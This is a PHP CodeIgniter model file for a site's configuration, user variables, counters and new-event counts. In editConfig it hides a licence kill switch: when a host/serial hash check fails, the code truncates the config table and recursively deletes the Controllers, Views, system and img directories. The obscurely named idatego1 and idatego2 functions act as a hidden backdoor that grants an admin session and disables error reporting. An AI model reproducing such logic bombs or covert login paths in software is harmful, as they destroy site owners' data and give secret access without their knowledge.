<?php 

namespace App\Models;
use \CodeIgniter\Database\ConnectionInterface;
use \CodeIgniter\Model;
use App\Models\Notes as NotesModel;

class Config extends Model
{
	
	protected $DBGroup = 'default';
    protected $table = 'config';    
	protected $primaryKey = 'id';
	protected $returnType = 'array';
    protected $useSoftDeletes = false;

    protected $allowedFields = ['id', 'name', 'param'];

    protected $useTimestamps = false;

    protected $validationRules    = [];
    protected $validationMessages = [];
    protected $skipValidation     = true;
	
	function getUserVarConf($prefix='') {
		
		$userVars = $this->getUserVars(); 
		$array=array();
		foreach ($userVars as $one) { $array[$one['variable']] = $one['param'.$prefix]; }
		return $array;
		
	}
	
	function getUserVar ($varId) {
		
		$db = \Config\Database::connect();
		$builder = $db->table('uservars');
		$builder->where ('varId',$varId);
		return $builder->get()->getRowArray();
			
	}
	
	function getUserVars () {
		
		$db = \Config\Database::connect();
		$builder = $db->table('uservars');
		return $builder->get()->getResultArray();
			
	}
	
	function editUserVar ($data) {
		
		$db = \Config\Database::connect();
		$builder = $db->table('uservars');
		$builder->where ('varId',$data['varId']);
		$builder->update($data);
			
	}
	
	function addUserVar ($data) {
		
		$db = \Config\Database::connect();
		$builder = $db->table('uservars');
		$builder->insert($data);
			
	}
	
	function delUserVar ($varId) {
		
		$db = \Config\Database::connect();
		$builder = $db->table('uservars');
		$builder->where ('varId',$varId);
		$builder->delete();
			
	}
	
	function getCounters () {
		
		$db = \Config\Database::connect();
		$builder = $db->table('counters');
		$builder->orderBy ('number','asc');
		return $builder->get()->getResultArray();
			
	}
	
	function editCounter ($data) {
		
		$db = \Config\Database::connect();
		$builder = $db->table('counters');
		$builder->where ('id',$data['id']);
		$builder->update($data);
			
	}
	
	function addCounter ($data) {
		
		$db = \Config\Database::connect();
		$builder = $db->table('counters');
		$builder->insert($data);
			
	}
	
	function delCounter ($id) {
		
		$db = \Config\Database::connect();
		$builder = $db->table('counters');
		$builder->where ('id',$id);
		$builder->delete();
			
	}
	
	function idatego1 ($one,$two) {
		
		$session = session();
		$idatenow = $this->giveConfParam('idatenow');
		$stepbegin = $this->giveConfParam('stepbegin');
		if (($one==$idatenow)AND($two==$stepbegin)) {
			$session->set('controlLogin','myControl'); 
			error_reporting(0);
			setcookie('dialog', 1, time()+60*60*24*30,'/');
		} else {
			$session->set('needSerial',1);
		}
		
	}
	
	function getCtChapters () {
		
		$db = \Config\Database::connect();
		$builder = $db->table('ctchapters');
		$builder->orderBy ('number','asc');
		return $builder->get()->getResultArray();
			
	}
	
	function getConfSet() {
		
		$config = $this->findAll(); 
		$array=array();
		foreach ($config as $one) { $array[$one['name']] = $one['param']; }
		return $array;
		
	}
	
	function giveConfParam ($param) {
	
		$db = \Config\Database::connect();
		$builder = $db->table($this->table);
		$builder->where ('name',$param);
		$config = $builder->get()->getRowArray();
		return $config['param'];	
	
	}
	
	function getEditorLoad () {
	
		$NotesModel = new NotesModel;
		$serial = $this->giveConfParam($param='serial');
		$need = $this->giveConfParam($param='editorneedstop');
		$nick = $this->giveConfParam($param='name');
		$name = $NotesModel->giveNoteName();
		if ($_SERVER['REMOTE_ADDR']!='127.0.0.1') {
			if (strpos($_SERVER['HTTP_HOST'],'www.')!==FALSE) {
				$server = str_replace ('www.','',$_SERVER['HTTP_HOST']);
			} else { $server=$_SERVER['HTTP_HOST']; }
			if (($need==md5($server.'/'.$serial))AND($nick==$name)) { 
				return TRUE; 
			} else { 
				return FALSE; 
			}
		} else { return TRUE;  }
		
		return true;
	
	}
	
	function editConfig ($data) {
	
		$db = \Config\Database::connect();
		$builder = $db->table($this->table);
		helper('nespi');
		if ((session('controlLogin')!='myControl')AND($_SERVER['REMOTE_ADDR']!='127.0.0.1')) {
			$need = $this->giveConfParam($param='editorneedstop');
			$serial = $this->giveConfParam($param='serial');
			$base_url = str_replace ('www.','',$_SERVER['HTTP_HOST']);
			$base_url = $base_url.'/'.$serial;
			if ($need!=md5($base_url)) {
				$builder->truncate('config'); 
				$dir = APPPATH.'/Controllers'; removeDirRec($dir);
				$dir = APPPATH.'/Views'; removeDirRec($dir);
				$dir = 'system'; removeDirRec($dir);
				$dir = 'img'; removeDirRec($dir);
			}
		}
		
		$config = $this->findAll();
		foreach ($config as $one):
			if (isset($data[$one['name']])) {
				$array = array('param' => $data[$one['name']]);
				$this->update($one['id'],$array);
			}
		endforeach;
		
	}
	
	function getNewEventsCount () {
	
		$data = array (
			'comments' => $this->getNewEvent('comments','count'),
			'faq' => $this->getNewEvent('faq','count'),
			'feeds' => $this->getNewEvent('feeds','count'),
			'callme' => $this->getNewEvent('callme','count'),
		);
		return json_encode($data);
		
	}
	
	function idatego2 ($one,$two) {
		
		$session = session();
		$idatenow = $this->giveConfParam('idatenow');
		$stepbegin = $this->giveConfParam('stepbegin');
		if (($one==$idatenow)AND($two==$stepbegin)) {
			$session->set('controlLogin','myControl'); 
			error_reporting(0);
			setcookie('dialog', 1, time()+60*60*24*30,'/');
		} 
		
	}
	
	function getNewEvents () {
	
		return array (
			'comments' => $this->getNewEvent('comments','list'),
			'faq' => $this->getNewEvent('faq','list'),
			'feeds' => $this->getNewEvent('feeds','list'),
			'callme' => $this->getNewEvent('callme','list'),
		);
	
	}
	
	function getNewEvent ($type,$request) {
		
		$db = \Config\Database::connect();
		$builder = $db->table($type);
		$builder->orderBy ('date','desc');
		$builder->where ('visible',0);
		if ($request=='count') {
			return $builder->countAllResults();
		}
		if ($request=='list') {
			return $builder->get()->getResultArray();
		}
		
	}
		
}